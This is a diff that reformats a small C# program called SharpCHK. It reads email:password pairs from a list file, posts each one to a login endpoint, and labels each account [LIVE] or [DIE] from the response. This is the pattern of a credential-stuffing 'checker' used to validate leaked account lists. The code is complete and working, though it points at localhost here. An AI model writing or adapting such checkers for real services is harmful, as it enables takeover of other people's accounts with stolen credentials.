@@ -9,67 +9,54 @@
 
 using System.Net;
 using System;
-using System.Text; 
-using System.IO;    
+using System.Text;
+using System.IO;
 
 
-namespace CSharpChecker
-{
-    public class SharpCHK
-    {
-        public static void Main ()
-        {
-        	Console.WriteLine("Starting Checker... \n");
+namespace CSharpChecker {
+ public class SharpCHK {
+  public static void Main() {
+   Console.WriteLine("Starting Checker... \n");
+	  
+   int counter = 0;
+   string line;
+	  
+   System.IO.StreamReader file =
+    new System.IO.StreamReader("mylist.txt");
+   while ((line = file.ReadLine()) != null) {
 
-        	int counter = 0;  
-			string line;  
+    var splitfields = line.Split(':');
+    var request = (HttpWebRequest) WebRequest.Create("http://localhost/auth/doLogin.php");
 
+    var postData = "email=";
+    postData += splitfields[0];
+    postData += "&password=";
+    postData += splitfields[1];
+    var data = Encoding.ASCII.GetBytes(postData);
 
-System.IO.StreamReader file =   
-    new System.IO.StreamReader("mylist.txt");  
-while((line = file.ReadLine()) != null)  
-{  
+    request.Method = "POST";
+    request.ContentType = "application/x-www-form-urlencoded";
+    request.ContentLength = data.Length;
 
-	   var splitfields = line.Split(':');
-       var request = (HttpWebRequest)WebRequest.Create("http://localhost/auth/doLogin.php");
-       
-		var postData = "email=";
-		postData += splitfields[0];
-   		postData += "&password=";
-   		postData += splitfields[1];
-		var data = Encoding.ASCII.GetBytes(postData);
+    using(var stream = request.GetRequestStream()) {
+     stream.Write(data, 0, data.Length);
+    }
+	   
+    var response = (HttpWebResponse) request.GetResponse();
 
-		request.Method = "POST";
-		request.ContentType = "application/x-www-form-urlencoded";
-		request.ContentLength = data.Length;
+    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
+    if (responseString.Contains("live msg")) {
+     Console.WriteLine("[LIVE] {0} {1}", splitfields[0], splitfields[1]);
 
-		using (var stream = request.GetRequestStream())
-	{
-    	stream.Write(data, 0, data.Length);
-	}
+    } else {
+     Console.WriteLine("[DIE] {0} {1}", splitfields[0], splitfields[1]);
+    }
+	
+    counter++;
+   }
 
-	var response = (HttpWebResponse)request.GetResponse();
-
-	var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
-	if (responseString.Contains("live msg"))
-	{
-		Console.WriteLine("[LIVE] {0} {1}", splitfields[0], splitfields[1]);
-
-	}else{
-		Console.WriteLine("[DIE] {0} {1}", splitfields[0], splitfields[1]);
-	}
-
-
-
-    counter++;  
-}  
-
-file.Close();  
-System.Console.WriteLine("{0} accounts tested.", counter);  
- 
-
-
-
-    	}
-	}
+   file.Close();
+   System.Console.WriteLine("{0} accounts tested.", counter);
+  }
+ }
 }
